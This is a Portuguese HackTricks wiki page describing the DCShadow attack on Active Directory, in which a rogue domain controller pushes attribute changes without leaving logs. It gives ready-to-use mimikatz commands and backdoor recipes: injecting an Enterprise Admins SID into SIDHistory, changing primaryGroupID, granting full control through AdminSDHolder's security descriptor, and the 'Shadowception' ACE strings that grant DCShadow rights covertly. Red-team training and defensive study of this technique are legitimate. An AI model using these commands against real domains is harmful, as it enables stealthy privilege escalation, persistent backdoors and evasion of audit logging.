{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DCShadow

Ele registra um **novo Controlador de Domínio** no AD e o utiliza para **empurrar atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar nenhum **log** sobre as **modificações**. Você **precisa de privilégios de DA** e estar dentro do **domínio raiz**.\
Observe que se você usar dados incorretos, logs bem feios aparecerão.

Para realizar o ataque, você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios de SYSTEM (você deve indicar aqui as alterações que deseja realizar), e a outra instância será usada para empurrar os valores:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Necessita de DA ou similar" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Observe que **`elevate::token`** não funcionará na sessão `mimikatz1`, pois isso elevou os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
Você também pode selecionar um objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Você pode enviar as alterações de um DA ou de um usuário com essas permissões mínimas:

* No **objeto de domínio**:
* _DS-Install-Replica_ (Adicionar/Remover Réplica no Domínio)
* _DS-Replication-Manage-Topology_ (Gerenciar Topologia de Replicação)
* _DS-Replication-Synchronize_ (Sincronização de Replicação)
* O **objeto Sites** (e seus filhos) no **container de Configuração**:
* _CreateChild e DeleteChild_
* O objeto do **computador que está registrado como um DC**:
* _WriteProperty_ (Não Write)
* O **objeto alvo**:
* _WriteProperty_ (Não Write)

Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para conceder esses privilégios a um usuário sem privilégios (observe que isso deixará alguns logs). Isso é muito mais restritivo do que ter privilégios de DA.\
Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Isso significa que o nome de usuário _**student1**_ ao fazer login na máquina _**mcorp-student1**_ tem permissões DCShadow sobre o objeto _**root1user**_.

## Usando DCShadow para criar backdoors

{% code title="Definir Enterprise Admins em SIDHistory para um usuário" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Alterar PrimaryGroupID (colocar usuário como membro dos Administradores do Domínio)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Modificar ntSecurityDescriptor do AdminSDHolder (dar Controle Total a um usuário)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Dê permissões ao DCShadow usando DCShadow (sem logs de permissões modificados)

Precisamos adicionar os seguintes ACEs com o SID do nosso usuário no final:

* No objeto de domínio:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* No objeto do computador atacante: `(A;;WP;;;UserSID)`
* No objeto do usuário alvo: `(A;;WP;;;UserSID)`
* No objeto Sites no contêiner de Configuração: `(A;CI;CCDC;;;UserSID)`

Para obter o ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Observe que, neste caso, você precisa fazer **várias alterações,** não apenas uma. Portanto, na **sessão mimikatz1** (servidor RPC), use o parâmetro **`/stack` com cada alteração** que deseja fazer. Dessa forma, você só precisará **`/push`** uma vez para realizar todas as alterações acumuladas no servidor rogue.

[**Mais informações sobre DCShadow em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
